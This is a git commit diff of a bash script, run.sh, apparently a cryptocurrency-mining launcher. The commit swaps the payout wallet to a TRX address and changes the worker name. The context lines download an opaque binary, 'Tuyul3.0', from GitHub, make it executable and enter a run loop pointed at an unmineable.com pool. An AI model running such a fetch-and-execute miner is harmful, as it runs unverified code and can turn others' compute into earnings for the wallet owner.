7eaec2e704a9c3eb04aff7667e518eb0e4d43841
thecoderop <87470287+thecoderop@users.noreply.github.com>
2021-07-29 21:48:24 +0530

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0x66d950b2ca00ac190ab38cbdf88066903683cdcb
-WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#rb4v-nhqi)
+WALLET=TRX:TGqQjwcpN2NHYVHtCc3ZG6FgdEdCr9puJK
+WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#8rgx-in2z)
 wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
 chmod +x Tuyul3.0
 while [ 1 ]; do
